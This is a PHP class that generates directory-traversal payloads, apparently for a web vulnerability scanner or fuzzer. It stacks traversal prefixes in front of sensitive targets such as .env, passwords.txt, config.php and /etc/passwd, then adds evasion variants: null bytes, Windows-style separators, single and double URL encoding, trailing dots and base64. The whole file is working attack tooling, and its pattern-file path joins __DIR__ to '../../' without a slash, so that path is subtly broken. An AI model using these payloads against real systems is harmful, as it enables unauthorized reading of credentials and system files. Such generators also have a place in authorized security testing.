<?php

namespace Engine;

class PayloadGenerator {
    private const PATTERN_FILE = __DIR__ . '../../materials/patterns.json';
    private const FILE_SAMPLE = [
        'config.php',
        'index.php',
        '.env',
        'secret.txt',
        'passwords.txt',
        'admin/config.php',
        '/etc/passwd',
        'C:\\Windows\\System32\\drivers\\etc\\hosts',
    ];
    
    private $patterns = [];

    public function __construct() {
        $this->patterns = self::generatePatterns();
    }
    
    public static function generatePatterns(): array {
        $raw = json_decode(file_get_contents(self::PATTERN_FILE), true);
        
        $traversals = [];

        foreach ($raw as $entry) {
            $patterns = $entry['patterns'];
            foreach ($patterns as $pattern) {
                $traversals[] = $pattern;
            }
        }

        return $traversals;
    }

    public function generatePayloads(): array {
        $payloads = [];
        foreach ($this->patterns as $prefix) {
            foreach (self::FILE_SAMPLE as $target) {
                for ($i=1; $i<=3; $i++) {
                    $step = str_repeat($prefix, $i);
                    $path = $step . $target;

                    $payloads[] = $path;
                    // Escaped
                    $payloads[] = addslashes($path);
                    // Windows-Style
                    $payloads[] = str_replace('/', '\\', $path);
                    // Null byte
                    $payloads[] = $path . '%00';
                    // Obfuscation dots
                    $payloads[] = $path . "...";
                    // URL encoding
                    $payloads[] = rawurlencode($path);
                    // Double URL encoding
                    $payloads[] = rawurlencode(rawurlencode($path));
                    // Base64 encoding
                    $payloads[] = base64_encode($path);
                }
            }
        }

        // Remove duplicates
        $payloads = array_values(array_unique($payloads));

        return $payloads;
    }

    public function getPatterns(): array {
        return $this->patterns;
    }

    public function getPayloads(): array {
        return $this->generatePayloads();
    }
}